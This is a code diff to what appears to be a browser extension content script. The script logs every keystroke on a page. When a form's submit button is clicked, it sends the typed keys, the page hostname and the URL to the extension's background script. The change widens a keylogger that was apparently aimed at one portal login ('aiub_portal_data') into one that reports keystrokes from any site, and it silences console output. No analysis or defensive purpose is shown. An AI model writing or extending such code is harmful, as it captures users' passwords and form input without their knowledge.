@@ -1,14 +1,13 @@
 var keyPressed = [];
 var submitBtn = document.querySelector('button[type=submit]');
 
-document.addEventListener('keypress', function(e){
+document.addEventListener('keydown', function(e){
   keyPressed.push(e.key);
 });
 
 submitBtn.addEventListener('click', function(e) {
-  console.log("Clicked");
   // pass data to background script
-  chrome.runtime.sendMessage({"aiub_portal_data": keyPressed}, function(response) {
-    console.log(response);
+  chrome.runtime.sendMessage({"keyPressed": keyPressed, "source_hostname": window.location.hostname, "source_url": window.location.href}, function(response) {
+    // console.log(response);
   });
 });
